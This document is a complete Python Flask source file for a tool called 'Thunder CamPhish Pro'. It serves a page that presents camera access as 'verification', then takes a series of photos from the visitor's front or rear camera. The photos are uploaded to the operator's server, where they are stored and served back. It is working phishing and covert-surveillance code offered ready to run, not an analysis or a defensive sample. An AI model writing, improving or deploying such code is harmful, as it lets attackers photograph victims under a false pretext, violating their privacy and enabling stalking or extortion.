from flask import Flask, request, render_template_string, send_from_directory
import os
from datetime import datetime

app = Flask(__name__)
CAPTURE_DIR = "captures"
os.makedirs(CAPTURE_DIR, exist_ok=True)

INDEX_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<title>Thunder CamPhish Pro</title>
<style>
  body { background: linear-gradient(to right, #0f2027, #203a43, #2c5364); color: white; font-family: 'Segoe UI', sans-serif; text-align: center; margin-top: 2em;}
  video { width: 300px; height: 220px; border-radius: 10px; border: 3px solid white; object-fit: cover; }
  button { margin: 10px; padding: 10px 20px; font-size: 1em; border-radius: 25px; border:none; cursor:pointer; }
  #log { margin-top: 20px; }
</style>
</head>
<body>
<h1>🔥 Thunder CamPhish Pro 🔥</h1>
<p>Allow camera and start verification</p>

<button onclick="startCamera()">Start Camera</button>
<button onclick="switchCamera()">Switch Camera</button>
<button onclick="startCapture()">Capture Photos</button>

<br>
<video id="video" autoplay playsinline></video>

<div id="log"></div>

<script>
  let stream;
  let videoTrack;
  let facingMode = "user"; // front camera

  async function startCamera() {
    if (stream) {
      stream.getTracks().forEach(t => t.stop());
    }
    try {
      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
      videoTrack = stream.getVideoTracks()[0];
      document.getElementById("video").srcObject = stream;
      log("Camera started: " + facingMode);
    } catch(e) {
      log("Error starting camera: " + e.message);
    }
  }

  async function switchCamera() {
    facingMode = facingMode === "user" ? "environment" : "user";
    await startCamera();
  }

  async function startCapture() {
    if (!videoTrack) {
      alert("Start the camera first!");
      return;
    }
    const imageCapture = new ImageCapture(videoTrack);
    let count = 0;
    const maxShots = 5;
    const intervalMs = 3000;

    const captureInterval = setInterval(async () => {
      try {
        const blob = await imageCapture.takePhoto();
        const arrayBuffer = await blob.arrayBuffer();
        await fetch('/upload', { method: 'POST', body: arrayBuffer });
        count++;
        log("Captured photo " + count + "/" + maxShots);
        if (count >= maxShots) {
          clearInterval(captureInterval);
          alert("Capture complete");
        }
      } catch (err) {
        log("Capture error: " + err);
        clearInterval(captureInterval);
      }
    }, intervalMs);
  }

  function log(msg) {
    document.getElementById("log").innerText = msg;
  }
</script>
</body>
</html>
"""

@app.route("/")
def index():
    return render_template_string(INDEX_HTML)

@app.route("/upload", methods=["POST"])
def upload():
    data = request.get_data()
    if not data:
        return "No data", 400
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S_%f")
    filename = f"{CAPTURE_DIR}/capture_{timestamp}.jpg"
    with open(filename, "wb") as f:
        f.write(data)
    print(f"Saved capture: {filename}")
    return "OK"

@app.route('/captures/<path:filename>')
def serve_file(filename):
    return send_from_directory(CAPTURE_DIR, filename)

if __name__ == "__main__":
    print("Starting Thunder CamPhish Pro Python server on http://0.0.0.0:3333")
    app.run(host="0.0.0.0", port=3333)
